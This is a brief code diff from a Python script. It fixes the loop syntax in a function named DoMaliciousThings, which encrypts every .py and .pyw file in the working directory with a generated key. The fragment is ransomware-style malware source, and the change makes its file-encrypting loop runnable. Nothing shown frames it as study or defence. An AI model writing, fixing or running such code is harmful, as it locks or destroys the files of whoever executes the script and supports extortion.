@@ -38,8 +38,8 @@ def decrypt(filename, key):
         file.write(decrypted_data)
 
 def DoMaliciousThings():
-    for file in glob.glob('*.py') + glob.glob('*.pyw')
-    encrypt(file,key)
+    for file in glob.glob('*.py') + glob.glob('*.pyw'):
+        encrypt(file,key)
 
 
 write_key()
